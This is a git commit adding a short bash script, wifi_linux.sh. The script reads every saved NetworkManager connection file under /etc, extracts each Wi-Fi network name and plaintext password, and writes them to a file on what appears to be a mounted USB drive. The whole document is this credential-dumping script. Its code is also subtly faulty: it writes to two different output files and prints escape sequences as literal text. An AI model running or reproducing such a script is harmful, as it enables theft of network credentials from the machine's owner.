900ec8c755213b935851dd8b93ee2d7700f7a601
user-sspmynxdvb <132933165+user-sspmynxdvb@users.noreply.github.com>
2024-05-30 16:13:37 +0300

    v2

---
+++ wifi_linux.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+echo "Wireless_Network_Name Password\n--------------------- --------" > /media/$(hostname)/$1/wifi.txt
+
+for FILE in /etc/NetworkManager/system-connections/*
+do
+    echo "$(cat "$FILE" | grep -oP '(?<=ssid=).*') \t\t\t\t  $(cat "$FILE" | grep -oP '(?<=psk=).*')"
+done >> /media/$(hostname)/$1/wifi_pass.txt
